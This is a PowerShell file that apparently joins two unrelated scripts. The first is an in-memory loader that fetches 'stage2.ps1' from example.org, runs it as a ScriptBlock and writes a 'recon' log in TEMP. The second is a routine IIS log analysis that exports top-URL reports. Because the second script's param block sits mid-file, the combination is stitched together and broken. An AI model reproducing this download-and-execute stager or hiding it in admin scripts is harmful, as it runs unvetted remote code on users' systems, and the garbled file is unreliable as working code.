[CmdletBinding()]
param(
    [string]$DownloadUrl = "https://example.org/stage2.ps1",
    [string]$ActivityLog = "$env:TEMP\recon.log",
    [int]$StageTimeout = 30
)
$ErrorActionPreference = "Stop"

function Get-StageScriptText {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [int]$TimeoutSec = 30
    )

    Write-Verbose ("Fetching script text from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadString($SourceUrl)
}

function Invoke-Stage2Script {
    param(
        [string]$ScriptBody = ""
    )

    if ([string]::IsNullOrWhiteSpace($ScriptBody)) {
        throw "Stage 2 script body is empty"
    }
    Write-Verbose ("Script length: " + $ScriptBody.Length)
    $ScriptBlock = [ScriptBlock]::Create($ScriptBody)
    return $ScriptBlock.Invoke()
}

Write-Verbose "Starting in-memory stage"
$PayloadText = Get-StageScriptText -SourceUrl $DownloadUrl -TimeoutSec $StageTimeout
$FetchResult = Invoke-Stage2Script -ScriptBody $PayloadText
Write-Verbose "Stage result: $($FetchResult)"

$LoadReport = [ordered]@{
    Stage = "memory"
    Endpoint = $DownloadUrl
    ScriptLength = $PayloadText.Length
}
$LoadReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $ActivityLog -Append
Write-Verbose "Starting workflow"
Write-Verbose "Validating result"
Write-Verbose "Reading configuration values"
Write-Verbose "Operation completed"
Write-Verbose "Preparing working directory"
Write-Verbose "Resolving configured target"
Write-Verbose "Collecting host metadata"
Write-Verbose "Retry budget remaining"
Write-Output "stage 12 initialized"
Set-Location -Path $env:TEMP

# Operational notes
# Errors are surfaced as warnings instead of terminating the flow.
# The launcher uses the default shell host.
# All paths are resolved relative to the current user context.
[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$LogRoot = "D:\Logs\iis\W3SVC7",
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 90)]
    [int]$Days = 30,

    [int]$TopN = 20,

    [string]$OutputPath = "C:\Reports\iis-top-2024-09-04.csv",

    [string]$HtmlPath = 'D:\Ops\reports\iis-2024-09-04.html'
)

$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'

$cutoff = (Get-Date).AddDays(-$Days)
$logFiles = Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -ge $cutoff }
if (@($logFiles).Count -eq 0) {
    throw ("No IIS logs found in {0} for the last {1} days" -f $LogRoot, $Days)
}

$entries = foreach ($log in $logFiles) {
    $fieldLine = Get-Content -LiteralPath $log.FullName -TotalCount 20 |
        Where-Object { $_ -match '^#Fields:' } | Select-Object -First 1
    if (-not $fieldLine) {
        Write-Verbose ("Skipping {0}: no field header" -f $log.Name)
        continue
    }
    $columns = ($fieldLine -replace '^#Fields:\s*', '') -split ' '
    $statusIndex = [array]::IndexOf($columns, 'sc-status')
    $uriIndex = [array]::IndexOf($columns, 'cs-uri-stem')
    $methodIndex = [array]::IndexOf($columns, 'cs-method')
    $bytesIndex = [array]::IndexOf($columns, 'sc-bytes')
    $timeIndex = [array]::IndexOf($columns, 'time-taken')
    Get-Content -LiteralPath $log.FullName | Where-Object { $_ -notmatch '^#' } | ForEach-Object {
        $parts = $_ -split ' '
        if ($parts.Count -lt $columns.Count) {
            return
        }
        [pscustomobject]@{
            Date      = $parts[0]
            Time      = $parts[1]
            Method    = $parts[$methodIndex]
            Uri       = $parts[$uriIndex]
            Status    = [int]$parts[$statusIndex]
            Bytes     = [int]$parts[$bytesIndex]
            TimeTaken = [int]$parts[$timeIndex]
        }
    }
}

$totalRequests = @($entries).Count
$errorEntries = $entries | Where-Object { $_.Status -ge 400 }
$totalMB = [math]::Round((($entries | Measure-Object -Property Bytes -Sum).Sum) / 1MB, 2)
$topUrls = $entries |
    Group-Object -Property Uri |
    Sort-Object -Property Count -Descending |
    Select-Object -First $TopN -Property @{Name = 'Uri'; Expression = { $_.Name }}, Count
$byStatus = $entries |
    Group-Object -Property Status |
    Sort-Object -Property Count -Descending |
    Select-Object -Property @{Name = 'Status'; Expression = { $_.Name }}, Count

$topUrls | Export-Csv -NoTypeInformation -Path $OutputPath -Encoding UTF8

Write-Host ("Requests: {0} | Errors: {1} | Traffic: {2} MB" -f $totalRequests, @($errorEntries).Count, $totalMB) -ForegroundColor Cyan
$byStatus | Format-Table -AutoSize

$style = @'
<style>
body { font-family: Arial; font-size: 13px; }
table { border-collapse: collapse; width: 100%; }
th { background: #eeeeee; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$topUrls | ConvertTo-Html -Title 'Top URLs' -Head $style |
    Set-Content -Path $HtmlPath -Encoding UTF8
